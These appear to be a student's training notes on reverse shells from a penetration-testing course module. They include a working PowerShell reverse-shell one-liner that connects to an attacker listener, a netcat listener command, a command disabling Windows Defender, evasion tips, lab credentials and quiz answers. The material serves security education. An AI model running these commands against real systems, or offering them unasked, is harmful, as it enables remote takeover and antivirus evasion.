# NOTE — Reverse Shells

## ID
403

## Module
Shells & Payloads

## Kind
notes

## Title
Section 5 — Reverse Shells

## Description
Reverse shell = attacker hosts the listener, target connects out. The default approach against firewalled hosts because outbound on common ports (443) usually flies. Walks the PowerShell TCPClient one-liner and AV-bypass via Defender disable.

## Tags
reverse-shell, netcat, powershell, tcpclient, av-evasion, windows-defender

## Commands
- `sudo nc -lvnp 443` — attacker listener on common HTTPS port
- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` — PowerShell reverse-shell one-liner
- `Set-MpPreference -DisableRealtimeMonitoring $true` — disable Defender real-time scan (admin PS)
- `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` — RDP into the target

## What This Section Covers
With a reverse shell, the attacker runs the listener; the target dials home. This bypasses inbound firewall rules because most environments allow arbitrary egress on web ports. Reverse Shell Cheat Sheet (PayloadsAllTheThings, etc.) is the standard reference for one-liners across languages.

## Why Reverse Shells Win
- Outbound traffic is rarely filtered the same way as inbound.
- HTTPS port 443 is almost always open egress.
- Easier to deliver via web/exploit/social engineering.
- Layer-7 / deep-packet-inspection firewalls *can* still catch reverse shells even on 443.

## PowerShell Reverse Shell One-Liner
On Windows you usually use **PowerShell** (Netcat isn't native — uploading `nc.exe` adds steps and AV risk).

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Defender AV Block — Signature Detection
Out of the box, Defender flags this script:
```
This script contains malicious content and has been blocked by your antivirus software.
```
To proceed in lab conditions only, disable real-time monitoring from an **administrative PowerShell**:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
In real engagements: obfuscate, encode, or use an in-memory loader instead of disabling AV.

## Listener — Pick a Common Egress Port
`443` is best: matches HTTPS, almost never blocked outbound.
```shell
sudo nc -lvnp 443
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — When establishing a reverse shell, does the target act as client or server? | **client** | Attacker hosts listener (server); target initiates connection (client). |
| Q2 — RDP in, get a reverse shell, submit the hostname | **Shells-Win10** | RDP via `xfreerdp`, disable Defender RTM, run PS one-liner pointing at attacker's `nc -lvnp 443`, then `hostname` in the caught shell. |

## Key Takeaways
- Use **native tools** on the target (PowerShell on Windows, bash on Linux) — avoid uploading Netcat unless you must.
- 443 is the default reverse-shell port because of egress assumptions.
- AV bypass is a separate skill — vanilla payloads are signatured.

## Gotchas
- Pwnbox clipboard paste into RDP sessions sometimes drops characters — paste into Notepad first, then copy from there.
- Defender's block is silent enough to confuse you — check the listener side; no connection = something killed the payload pre-network.
- `-nop` (no profile) matters: a profile script can break/log the launch.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[04-bind-shells]] | [[06-introduction-to-payloads]] →
<!-- AUTO-LINKS-END -->
